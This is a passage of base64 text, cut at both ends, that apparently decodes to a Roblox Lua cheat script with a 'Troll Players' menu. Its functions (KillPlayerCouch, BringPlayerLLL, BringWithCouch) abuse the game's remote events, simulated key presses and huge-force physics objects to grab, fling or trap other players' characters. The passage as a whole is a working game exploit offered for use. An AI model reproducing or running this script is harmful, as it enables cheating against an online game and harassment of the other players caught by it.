ZPVSBHT1Vaw4PDg1JSUlIiCiAgICAgICAgdG9vbC5SZXF1aXJlc0hhbmRsZSA9IGZhbHNlCiAgICAgICAgdG9vbC5QYXJlbnQgPSBiYWNrcGFjawogICAgICAgIGxvY2FsIGpvcmtpbiA9IGZhbHNlCiAgICAgICAgbG9jYWwgdHJhY2sgPSBuaWwKICAgICAgICBsb2NhbCBmdW5jdGlvbiBzdG9wVG9tZm9vbGVyeSgpCiAgICAgICAgICAgIGpvcmtpbiA9IGZhbHNlCiAgICAgICAgICAgIGlmIHRyYWNrIHRoZW4KICAgICAgICAgICAgICAgIHRyYWNrOlN0b3AoKQogICAgICAgICAgICAgICAgdHJhY2sgPSBuaWwKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgdG9vbC5FcXVpcHBlZDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgam9ya2luID0gdHJ1ZQogICAgICAgIGVuZCkKICAgICAgICB0b29sLlVuZXF1aXBwZWQ6Q29ubmVjdChzdG9wVG9tZm9vbGVyeSkKICAgICAgICBodW1hbm9pZC5EaWVkOkNvbm5lY3Qoc3RvcFRvbWZvb2xlcnkpCiAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgIHdoaWxlIHRhc2sud2FpdCgpIGRvCiAgICAgICAgICAgICAgICBpZiBub3Qgam9ya2luIHRoZW4gY29udGludWUgZW5kCiAgICAgICAgICAgICAgICBpZiBub3QgdHJhY2sgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIGFuaW0gPSBJbnN0YW5jZS5uZXcoIkFuaW1hdGlvbiIpCiAgICAgICAgICAgICAgICAgICAgYW5pbS5BbmltYXRpb25JZCA9IG5vdCBJc1IxNSgpIGFuZCAicmJ4YXNzZXRpZDovLzcyMDQyMDI0IiBvciAicmJ4YXNzZXRpZDovLzY5ODI1MTY1MyIKICAgICAgICAgICAgICAgICAgICB0cmFjayA9IGh1bWFub2lkOkxvYWRBbmltYXRpb24oYW5pbSkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgdHJhY2s6UGxheSgpCiAgICAgICAgICAgICAgICB0cmFjazpBZGp1c3RTcGVlZChJc1IxNSgpIGFuZCAwLjcgb3IgMC42NSkKICAgICAgICAgICAgICAgIHRyYWNrLlRpbWVQb3NpdGlvbiA9IDAuNgogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMikKICAgICAgICAgICAgICAgIHdoaWxlIHRyYWNrIGFuZCB0cmFjay5UaW1lUG9zaXRpb24gPCAobm90IElzUjE1KCkgYW5kIDAuNjUgb3IgMC43KSBkbwogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjIpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGlmIHRyYWNrIHRoZW4KICAgICAgICAgICAgICAgICAgICB0cmFjazpTdG9wKCkKICAgICAgICAgICAgICAgICAgICB0cmFjayA9IG5pbAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgIGVuZAp9KQoKbG9jYWwgVHJvbGwgPSBXaW5kb3c6TWFrZVRhYih7IFRpdGxlID0gIu+4sVRyb2xsIFBsYXllcnMiLCBJY29uID0gInJieGFzc2V0aWQ6Ly8xMDcxNjA1MDAzMjkyNDEiIH0pCgpsb2NhbCBQbGF5ZXJzID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikKbG9jYWwgTG9jYWxQbGF5ZXIgPSBQbGF5ZXJzLkxvY2FsUGxheWVyCmxvY2FsIFJlcGxpY2F0ZWRTdG9yYWdlID0gZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpCmxvY2FsIFZpcnR1YWxJbnB1dE1hbmFnZXIgPSBnYW1lOkdldFNlcnZpY2UoIlZpcnR1YWxJbnB1dE1hbmFnZXIiKQpsb2NhbCBSdW5TZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJSdW5TZXJ2aWNlIikKbG9jYWwgY2FtID0gd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEKCgpsb2NhbCBzZWxlY3RlZFBsYXllck5hbWUgPSBuaWwKbG9jYWwgbWV0aG9kS2lsbCA9IG5pbApnZXRnZW52KCkuVGFyZ2V0ID0gbmlsCmxvY2FsIENoYXJhY3RlciA9IExvY2FsUGxheWVyLkNoYXJhY3Rlcgpsb2NhbCBIdW1hbm9pZCA9IENoYXJhY3RlciBhbmQgQ2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWQiKQpsb2NhbCBSb290UGFydCA9IENoYXJhY3RlciBhbmQgQ2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCgpsb2NhbCBmdW5jdGlvbiBjbGVhbnVwQ291Y2goKQogICAgbG9jYWwgY2hhciA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgaWYgY2hhciB0aGVuCiAgICAgICAgbG9jYWwgY291Y2ggPSBjaGFyOkZpbmRGaXJzdENoaWxkKCJDaGFvcy5Db3VjaCIpIG9yIExvY2FsUGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJDaGFvcy5Db3VjaCIpCiAgICAgICAgaWYgY291Y2ggdGhlbgogICAgICAgICAgICBjb3VjaDpEZXN0cm95KCkKICAgICAgICBlbmQKICAgIGVuZAogICAgLS0gQ2xlYW4gdG9vbHMgdmlhIHJlbW90ZQogICAgUmVwbGljYXRlZFN0b3JhZ2U6V2FpdEZvckNoaWxkKCJSRSIpOldhaXRGb3JDaGlsZCgiMUNsZWExclRvb2wxcyIpOkZpcmVTZXJ2ZXIoIkNsZWFyQWxsVG9vbHMiKQplbmQKCi0tIENvbm5lY3QgQ2hhcmFjdGVyQWRkZWQgZXZlbnQKTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6Q29ubmVjdChmdW5jdGlvbihuZXdDaGFyYWN0ZXIpCiAgICBDaGFyYWN0ZXIgPSBuZXdDaGFyYWN0ZXIKICAgIEh1bWFub2lkID0gbmV3Q2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWQiKQogICAgUm9vdFBhcnQgPSBuZXdDaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgIGNsZWFudXBDb3VjaCgpCiAgICAKICAgIC0tIENvbm5lY3QgRGllZCBldmVudCBmb3IgdGhlIG5ldyBIdW1hbm9pZAogICAgSHVtYW5vaWQuRGllZDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICBjbGVhbnVwQ291Y2goKQogICAgZW5kKQplbmQpCgotLSBDb25uZWN0IERpZWQgZXZlbnQgZm9yIHRoZSBpbml0aWFsIEh1bWFub2lkLCBpZiBpdCBleGlzdHMKaWYgSHVtYW5vaWQgdGhlbgogICAgSHVtYW5vaWQuRGllZDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICBjbGVhbnVwQ291Y2goKQogICAgZW5kKQplbmQKCi0tIEtpbGxQbGF5ZXJDb3VjaCBGdW5jdGlvbgpsb2NhbCBmdW5jdGlvbiBLaWxsUGxheWVyQ291Y2goKQogICAgaWYgbm90IHNlbGVjdGVkUGxheWVyTmFtZSB0aGVuCiAgICAgICAgd2Fybigi4p2M77ixTm8gcGxheWVyIHNlbGVjdGVkLiIpCiAgICAgICAgcmV0dXJuCiAgICBlbmQKICAgIGxvY2FsIHRhcmdldCA9IFBsYXllcnM6RmluZEZpcnN0Q2hpbGQoc2VsZWN0ZWRQbGF5ZXJOYW1lKQogICAgaWYgbm90IHRhcmdldCBvciBub3QgdGFyZ2V0LkNoYXJhY3RlciB0aGVuCiAgICAgICAgd2Fybigi4p2M77ixVGFyZ2V0IHBsYXllciBub3QgZm91bmQgb3IgaGFzIG5vIGNoYXJhY3Rlci4iKQogICAgICAgIHJldHVybgogICAgZW5kCgogICAgbG9jYWwgY2hhciA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgaWYgbm90IGNoYXIgdGhlbgogICAgICAgIHdhcm4oIuKdjO+4sUxvY2FsIHBsYXllciBjaGFyYWN0ZXIgbm90IGZvdW5kLiIpCiAgICAgICAgcmV0dXJuCiAgICBlbmQKICAgIGxvY2FsIGh1bSA9IGNoYXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpCiAgICBsb2NhbCByb290ID0gY2hhcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICBsb2NhbCB0Um9vdCA9IHRhcmdldC5DaGFyYWN0ZXIgYW5kIHRhcmdldC5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgaWYgbm90IGh1bSBvciBub3Qgcm9vdCBvciBub3QgdFJvb3QgdGhlbgogICAgICAgIHdhcm4oIuKdjO+4sVJlcXVpcmVkIGNvbXBvbmVudHMgbm90IGZvdW5kLiIpCiAgICAgICAgcmV0dXJuCiAgICBlbmQKCiAgICBsb2NhbCBvcmlnaW5hbFBvcyA9IHJvb3QuUG9zaXRpb24gCiAgICBsb2NhbCBzaXRQb3MgPSBWZWN0b3IzLm5ldygxNDUuNTEsIC0zNTAuMDksIDIxLjU4KQoKICAgIFJlcGxpY2F0ZWRTdG9yYWdlOldhaXRGb3JDaGlsZCgiUkUiKTpXYWl0Rm9yQ2hpbGQoIjFDbGVhMXJUb29sMXMiKTpGaXJlU2VydmVyKCJDbGVhckFsbFRvb2xzIikKICAgIHRhc2sud2FpdCgwLjIpCgogICAgUmVwbGljYXRlZFN0b3JhZ2UuUkU6RmluZEZpcnN0Q2hpbGQoIjFUb28xbCIpOkludm9rZVNlcnZlcigiUGlja2luZ1Rvb2xzIiwgIkNvdWNoIikKICAgIHRhc2sud2FpdCgwLjMpCgogICAgbG9jYWwgdG9vbCA9IExvY2FsUGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJDb3VjaCIpCiAgICBpZiB0b29sIHRoZW4gdG9vbC5QYXJlbnQgPSBjaGFyIGVuZAogICAgdGFzay53YWl0KDAuMSkKCiAgICBWaXJ0dWFsSW5wdXRNYW5hZ2VyOlNlbmRLZXlFdmVudCh0cnVlLCBFbnVtLktleUNvZGUuRiwgZmFsc2UsIGdhbWUpCiAgICB0YXNrLndhaXQoMC4xKQoKICAgIGh1bTpTZXRTdGF0ZUVuYWJsZWQoRW51bS5IdW1hbm9pZFN0YXRlVHlwZS5TZWF0ZWQsIGZhbHNlKQogICAgaHVtLlBsYXRmb3JtU3RhbmQgPSBmYWxzZQogICAgY2FtLkNhbWVyYVN1YmplY3QgPSB0YXJnZXQuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIZWFkIikgb3IgdFJvb3Qgb3IgaHVtCgogICAgbG9jYWwgYWxpZ24gPSBJbnN0YW5jZS5uZXcoIkJvZHlQb3NpdGlvbiIpCiAgICBhbGlnbi5OYW1lID0gIkJyaW5nUG9zaXRpb24iCiAgICBhbGlnbi5NYXhGb3JjZSA9IFZlY3RvcjMubmV3KG1hdGguaHVnZSwgbWF0aC5odWdlLCBtYXRoLmh1Z2UpCiAgICBhbGlnbi5EID0gMTAKICAgIGFsaWduLlAgPSAzMDAwMAogICAgYWxpZ24uUG9zaXRpb24gPSByb290LlBvc2l0aW9uCiAgICBhbGlnbi5QYXJlbnQgPSB0Um9vdAoKICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIGFuZ2xlID0gMAogICAgICAgIGxvY2FsIHN0YXJ0VGltZSA9IHRpY2soKQogICAgICAgIHdoaWxlIHRpY2soKSAtIHN0YXJ0VGltZSA8IDUgYW5kIHRhcmdldCBhbmQgdGFyZ2V0LkNoYXJhY3RlciBhbmQgdGFyZ2V0LkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikgZG8KICAgICAgICAgICAgbG9jYWwgdEh1bSA9IHRhcmdldC5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpCiAgICAgICAgICAgIGlmIG5vdCB0SHVtIG9yIHRIdW0uU2l0IHRoZW4gYnJlYWsgZW5kCgogICAgICAgICAgICBsb2NhbCBocnAgPSB0YXJnZXQuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQKICAgICAgICAgICAgbG9jYWwgYWRqdXN0ZWRQb3MgPSBocnAuUG9zaXRpb24gKyAoaHJwLlZlbG9jaXR5IC8gMS41KQoKICAgICAgICAgICAgYW5nbGUgKz0gNTAKICAgICAgICAgICAgcm9vdC5DRnJhbWUgPSBDRnJhbWUubmV3KGFkanVzdGVkUG9zICsgVmVjdG9yMy5uZXcoMCwgMiwgMCkpICogQ0ZyYW1lLkFuZ2xlcyhtYXRoLnJhZChhbmdsZSksIDAsIDApCiAgICAgICAgICAgIGFsaWduLlBvc2l0aW9uID0gcm9vdC5Qb3NpdGlvbiArIFZlY3RvcjMubmV3KDIsIDAsIDApCgogICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgIGVuZAoKICAgICAgICBhbGlnbjpEZXN0cm95KCkKICAgICAgICBodW06U2V0U3RhdGVFbmFibGVkKEVudW0uSHVtYW5vaWRTdGF0ZVR5cGUuU2VhdGVkLCB0cnVlKQogICAgICAgIGh1bS5QbGF0Zm9ybVN0YW5kID0gZmFsc2UKICAgICAgICBjYW0uQ2FtZXJhU3ViamVjdCA9IGh1bQoKICAgICAgICBmb3IgXywgcCBpbiBwYWlycyhjaGFyOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgIGlmIHA6SXNBKCJCYXNlUGFydCIpIHRoZW4KICAgICAgICAgICAgICAgIHAuVmVsb2NpdHkgPSBWZWN0b3IzLnplcm8KICAgICAgICAgICAgICAgIHAuUm90VmVsb2NpdHkgPSBWZWN0b3IzLnplcm8KICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCgogICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICAgICAgcm9vdC5DRnJhbWUgPSBDRnJhbWUubmV3KHNpdFBvcykKICAgICAgICB0YXNrLndhaXQoMC4zKQoKICAgICAgICBsb2NhbCB0b29sID0gY2hhcjpGaW5kRmlyc3RDaGlsZCgiQ291Y2giKQogICAgICAgIGlmIHRvb2wgdGhlbiB0b29sLlBhcmVudCA9IExvY2FsUGxheWVyLkJhY2twYWNrIGVuZAoKICAgICAgICB0YXNrLndhaXQoMC4wMSkKICAgICAgICBSZXBsaWNhdGVkU3RvcmFnZS5SRTpGaW5kRmlyc3RDaGlsZCgiMVRvbzFsIik6SW52b2tlU2VydmVyKCJQaWNraW5nVG9vbHMiLCAiQ291Y2giKQogICAgICAgIHRhc2sud2FpdCgwLjIpCiAgICAgICAgcm9vdC5DRnJhbWUgPSBDRnJhbWUubmV3KG9yaWdpbmFsUG9zKQogICAgZW5kKQplbmQKCi0tIEJyaW5nUGxheWVyTExMIEZ1bmN0aW9uCmxvY2FsIGZ1bmN0aW9uIEJyaW5nUGxheWVyTExMKCkKICAgIGlmIG5vdCBzZWxlY3RlZFBsYXllck5hbWUgdGhlbgogICAgICAgIHdhcm4oIuKdjO+4sU5vIHBsYXllciBzZWxlY3RlZC4iKQogICAgICAgIHJldHVybgogICAgZW5kCiAgICBsb2NhbCB0YXJnZXQgPSBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKHNlbGVjdGVkUGxheWVyTmFtZSkKICAgIGlmIG5vdCB0YXJnZXQgb3Igbm90IHRhcmdldC5DaGFyYWN0ZXIgdGhlbgogICAgICAgIHdhcm4oIuKdjO+4sVRhcmdldCBwbGF5ZXIgbm90IGZvdW5kIG9yIGhhcyBubyBjaGFyYWN0ZXIuIikKICAgICAgICByZXR1cm4KICAgIGVuZAoKICAgIGxvY2FsIGNoYXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgIGlmIG5vdCBjaGFyIHRoZW4KICAgICAgICB3YXJuKCLinYzvuLFMb2NhbCBwbGF5ZXIgY2hhcmFjdGVyIG5vdCBmb3VuZC4iKQogICAgICAgIHJldHVybgogICAgZW5kCiAgICBsb2NhbCBodW0gPSBjaGFyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiSHVtYW5vaWQiKQogICAgbG9jYWwgcm9vdCA9IGNoYXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgbG9jYWwgdFJvb3QgPSB0YXJnZXQuQ2hhcmFjdGVyIGFuZCB0YXJnZXQuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgIGlmIG5vdCBodW0gb3Igbm90IHJvb3Qgb3Igbm90IHRSb290IHRoZW4KICAgICAgICB3YXJuKCLinYzvuLFSZXF1aXJlZCBjb21wb25lbnRzIG5vdCBmb3VuZC4iKQogICAgICAgIHJldHVybgogICAgZW5kCgogICAgbG9jYWwgb3JpZ2luYWxQb3MgPSByb290LlBvc2l0aW9uIAogICAgUmVwbGljYXRlZFN0b3JhZ2U6V2FpdEZvckNoaWxkKCJSRSIpOldhaXRGb3JDaGlsZCgiMUNsZWExclRvb2wxcyIpOkZpcmVTZXJ2ZXIoIkNsZWFyQWxsVG9vbHMiKQogICAgdGFzay53YWl0KDAuMikKCiAgICBSZXBsaWNhdGVkU3RvcmFnZS5SRTpGaW5kRmlyc3RDaGlsZCgiMVRvbzFsIik6SW52b2tlU2VydmVyKCJQaWNraW5nVG9vbHMiLCAiQ291Y2giKQogICAgdGFzay53YWl0KDAuMykKCiAgICBsb2NhbCB0b29sID0gTG9jYWxQbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIkNvdWNoIikKICAgIGlmIHRvb2wgdGhlbgogICAgICAgIHRvb2wuUGFyZW50ID0gY2hhcgogICAgZW5kCiAgICB0YXNrLndhaXQoMC4xKQoKICAgIFZpcnR1YWxJbnB1dE1hbmFnZXI6U2VuZEtleUV2ZW50KHRydWUsIEVudW0uS2V5Q29kZS5GLCBmYWxzZSwgZ2FtZSkKICAgIHRhc2sud2FpdCgwLjEpCgogICAgaHVtOlNldFN0YXRlRW5hYmxlZChFbnVtLkh1bWFub2lkU3RhdGVUeXBlLlNlYXRlZCwgZmFsc2UpCiAgICBodW0uUGxhdGZvcm1TdGFuZCA9IGZhbHNlCiAgICBjYW0uQ2FtZXJhU3ViamVjdCA9IHRhcmdldC5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkhlYWQiKSBvciB0Um9vdCBvciBodW0KCiAgICBsb2NhbCBhbGlnbiA9IEluc3RhbmNlLm5ldygiQm9keVBvc2l0aW9uIikKICAgIGFsaWduLk5hbWUgPSAiQnJpbmdQb3NpdGlvbiIKICAgIGFsaWduLk1heEZvcmNlID0gVmVjdG9yMy5uZXcobWF0aC5odWdlLCBtYXRoLmh1Z2UsIG1hdGguaHVnZSkKICAgIGFsaWduLkQgPSAxMAogICAgYWxpZ24uUCA9IDMwMDAwCiAgICBhbGlnbi5Qb3NpdGlvbiA9IHJvb3QuUG9zaXRpb24KICAgIGFsaWduLlBhcmVudCA9IHRSb290CgogICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgYW5nbGUgPSAwCiAgICAgICAgbG9jYWwgc3RhcnRUaW1lID0gdGljaygpCiAgICAgICAgd2hpbGUgdGljaygpIC0gc3RhcnRUaW1lIDwgNSBhbmQgdGFyZ2V0IGFuZCB0YXJnZXQuQ2hhcmFjdGVyIGFuZCB0YXJnZXQuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiSHVtYW5vaWQiKSBkbwogICAgICAgICAgICBsb2NhbCB0SHVtID0gdGFyZ2V0LkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikKICAgICAgICAgICAgaWYgbm90IHRIdW0gb3IgdEh1bS5TaXQgdGhlbiBicmVhayBlbmQKCiAgICAgICAgICAgIGxvY2FsIGhycCA9IHRhcmdldC5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydAogICAgICAgICAgICBsb2NhbCBhZGp1c3RlZFBvcyA9IGhycC5Qb3NpdGlvbiArIChocnAuVmVsb2NpdHkgLyAxLjUpCgogICAgICAgICAgICBhbmdsZSArPSA1MAogICAgICAgICAgICByb290LkNGcmFtZSA9IENGcmFtZS5uZXcoYWRqdXN0ZWRQb3MgKyBWZWN0b3IzLm5ldygwLCAyLCAwKSkgKiBDRnJhbWUuQW5nbGVzKG1hdGgucmFkKGFuZ2xlKSwgMCwgMCkKICAgICAgICAgICAgYWxpZ24uUG9zaXRpb24gPSByb290LlBvc2l0aW9uICsgVmVjdG9yMy5uZXcoMiwgMCwgMCkKCiAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgZW5kCgogICAgICAgIGFsaWduOkRlc3Ryb3koKQogICAgICAgIGh1bTpTZXRTdGF0ZUVuYWJsZWQoRW51bS5IdW1hbm9pZFN0YXRlVHlwZS5TZWF0ZWQsIHRydWUpCiAgICAgICAgaHVtLlBsYXRmb3JtU3RhbmQgPSBmYWxzZQogICAgICAgIGNhbS5DYW1lcmFTdWJqZWN0ID0gaHVtCgogICAgICAgIGZvciBfLCBwIGluIHBhaXJzKGNoYXI6R2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICAgICAgaWYgcDpJc0EoIkJhc2VQYXJ0IikgdGhlbgogICAgICAgICAgICAgICAgcC5WZWxvY2l0eSA9IFZlY3RvcjMuemVybwogICAgICAgICAgICAgICAgcC5Sb3RWZWxvY2l0eSA9IFZlY3RvcjMuemVybwogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKCiAgICAgICAgdGFzay53YWl0KDAuMSkKICAgICAgICByb290LkFuY2hvcmVkID0gdHJ1ZQogICAgICAgIHJvb3QuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyhvcmlnaW5hbFBvcykKICAgICAgICB0YXNrLndhaXQoMC4wMDEpCiAgICAgICAgcm9vdC5BbmNob3JlZCA9IGZhbHNlCgogICAgICAgIHRhc2sud2FpdCgwLjcpCiAgICAgICAgbG9jYWwgdG9vbCA9IGNoYXI6RmluZEZpcnN0Q2hpbGQoIkNvdWNoIikKICAgICAgICBpZiB0b29sIHRoZW4KICAgICAgICAgICAgdG9vbC5QYXJlbnQgPSBMb2NhbFBsYXllci5CYWNrcGFjawogICAgICAgIGVuZAoKICAgICAgICB0YXNrLndhaXQoMC4wMDEpCiAgICAgICAgUmVwbGljYXRlZFN0b3JhZ2UuUkU6RmluZEZpcnN0Q2hpbGQoIjFUb28xbCIpOkludm9rZVNlcnZlcigiUGlja2luZ1Rvb2xzIiwgIkNvdWNoIikKICAgIGVuZCkKZW5kCgotLSBCcmluZ1dpdGhDb3VjaCBGdW5jdGlvbgpsb2NhbCBmdW5jdGlvbiBCcmluZ1dpdGhDb3VjaCgpCiAgICBsb2NhbCB0YXJnZXRQbGF5ZXIgPSBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKGdldGdlbnYoKS5UYXJnZXQpCiAgICBpZiBub3QgdGFyZ2V0UGxheWVyIHRoZW4KICAgICAgICB3YXJuKCLinYzvuLFObyB0YXJnZXQgcGxheWVyIHNlbGVjdGVkLiIpCiAgICAgICAgcmV0dXJuCiAgICBlbmQKICAgIGlmIG5vdCB0YXJnZXRQbGF5ZXIuQ2hhcmFjdGVyIG9yIG5vdCB0YXJnZXRQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikgdGhlbgogICAgICAgIHdhcm4oIuKdjO+4sVRhcmdldCBwbGF5ZXIgaGFzIG5vIGNoYXJhY3RlciBvciBIdW1hbm9pZFJvb3RQYXJ0LiIpCiAgICAgICAgcmV0dXJuCiAgICBlbmQKCiAgICBsb2NhbCBhcmdzID0geyBbMV0gPSAiQ2xlYXJBbGxUb29scyIgfQogICAgUmVwbGljYXRlZFN0b3JhZ2UuUkVbIjFDbGVhMXJUb29sMXMiXTpGaXJlU2VydmVyKHVucGFjayhhcmdzKSkKICAgIGxvY2FsIGFyZ3MgPSB7IFsxXSA9ICJQaWNraW5nVG9vbHMiLCBbMl0gPSAiQ291Y2giIH0KICAgIFJlcGxpY2F0ZWRTdG9yYWdlLlJFOkZpbmRGaXJzdENoaWxkKCIxVG9vMWwiKTpJbnZva2VTZXJ2ZXIodW5wYWNrKGFyZ3MpKQoKICAgIGxvY2FsIGNvdWNoID0gTG9jYWxQbGF5ZXIuQmFja3BhY2s6V2FpdEZvckNoaWxkKCJDb3VjaCIsIDIpCiAgICBpZiBub3QgY291Y2ggdGhlbgogICAgICAgIHdhcm4oIuKdjO+4sUNvdWNoIG5vdCBmb3VuZCBpbiBCYWNrcGFjay4iKQogICAgICAgIHJldHVybgogICAgZW5kCgogICAgY291Y2guTmFtZSA9ICJDaGFvcy5Db3VjaCIKICAgIGxvY2FsIHNlYXQxID0gY291Y2g6RmluZEZpcnN0Q2hpbGQoIlNlYXQxIikKICAgIGxvY2FsIHNlYXQyID0gY291Y2g6RmluZEZpcnN0Q2hpbGQoIlNlYXQyIikKICAgIGxvY2FsIGhhbmRsZSA9IGNvdWNoOkZpbmRGaXJzdENoaWxkKCJIYW5kbGUiKQogICAgaWYgc2VhdDEgYW5kIHNlYXQyIGFuZCBoYW5kbGUgdGhlbgogICAgICAgIHNlYXQxLkRpc2FibGVkID0gdHJ1ZQogICAgICAgIHNlYXQyLkRpc2FibGVkID0gdHJ1ZQogICAgICAgIGhhbmRsZS5OYW1lID0gIkhhbmRsZSAiCiAgICBlbHNlCiAgICAgICAgd2Fybigi4p2M77ixQ291Y2ggY29tcG9uZW50cyBub3QgZm91bmQuIikKICAgICAgICByZXR1cm4KICAgIGVuZAogICAgY291Y2guUGFyZW50ID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCgogICAgbG9jYWwgdGV0ID0gSW5zdGFuY2UubmV3KCJCb2R5VmVsb2NpdHkiLCBzZWF0MSkKICAgIHRldC5NYXhGb3JjZSA9IFZlY3RvcjMubmV3KG1hdGguaHVnZSwgbWF0aC5odWdlLCBtYXRoLmh1Z2UpCiAgICB0ZXQuUCA9IDEyNTAKICAgIHRldC5WZWxvY2l0eSA9IFZlY3RvcjMubmV3KDAsIDAsIDApCiAgICB0ZXQuTmFtZSA9ICIjbU9WT09FUEYkI0BGJCNHRVJFLi4+Vjw8PDxFVzxWPDxXIgoKICAgIHJlcGVhdAogICAgICAgIGZvciBtID0gMSwgMzUgZG8KICAgICAgICAgICAgbG9jYWwgcG9zID0geyB4ID0gMCwgeSA9IDAsIHogPSAwIH0KICAgICAgICAgICAgbG9jYWwgdFJvb3QgPSB0YXJnZXRQbGF5ZXIuQ2hhcmFjdGVyIGFuZCB0YXJnZXRQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQKICAgICAgICAgICAgaWYgbm90IHRSb290IHRoZW4gYnJlYWsgZW5kCiAgICAgICAgICAgIHBvcy54ID0gdFJvb3QuUG9zaXRpb24uWCArICh0Um9vdC5WZWxvY2l0eS5YIC8gMikKICAgICAgICAgICAgcG9zLnkgPSB0Um9vdC5Qb3NpdGlvbi5ZICsgKHRSb290LlZlbG9jaXR5LlkgLyAyKQogICAgICAgICAgICBwb3MueiA9IHRSb290LlBvc2l0aW9uLlogKyAodFJvb3QuVmVsb2NpdHkuWiAvIDIpCiAgICAgICAgICAgIHNlYXQxLkNGcmFtZSA9IENGcmFtZS5uZXcoVmVjdG9yMy5uZXcocG9zLngsIHBvcy55LCBwb3MueikpICogQ0ZyYW1lLm5ldygtMiwgMiwgMCkKICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICBlbmQKICAgICAgICB0ZXQ6RGVzdHJveSgpCiAgICAgICAgY291Y2guUGFyZW50ID0gTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICB0YXNrLndhaXQoKQogICAgICAgIGNvdWNoOkZpbmRGaXJzdENoaWxkKCJIYW5kbGUgIikuTmFtZSA9ICJIYW5kbGUiCiAgICAgICAgdGFzay53YWl0KDAuMikKICAgICAgICBjb3VjaC5QYXJlbnQgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICB0YXNrLndhaXQoKQogICAgICAgIGNvdWNoLlBhcmVudCA9IExvY2FsUGxheWVyLkJhY2twYWNrCiAgICAgICAgY291Y2guSGFuZGxlLk5hbWUgPSAiSGFuZGxlICIKICAgICAgICB0YXNrLndhaXQoMC4yKQogICAgICAgIGNvdWNoLlBhcmVudCA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgIHRldCA9IEluc3RhbmNlLm5ldygiQm9keVZlbG9jaXR5Iiwgc2VhdDEpCiAgICAgICAgdGV0Lk1heEZvcmNlID0gVmVjdG9yMy5uZXcobWF0aC5odWdlLCBtYXRoLmh1Z2UsIG1hdGguaHVnZSkKICAgICAgICB0ZXQuUCA9IDEyNTAKICAgICAgICB0ZXQuVmVsb2NpdHkgPSBWZWN0b3IzLm5ldygwLCAwLCAwKQogICAgICAgIHRldC5OYW1lID0gIiNtT1ZPT0VQRiQjQEYkI0dFUkUuLj5WPDw8PEVXPFY8PFciCiAgICB1bnRpbCB0YXJnZXRQbGF5ZXIuQ2hhcmFjdGVyIGFuZCB0YX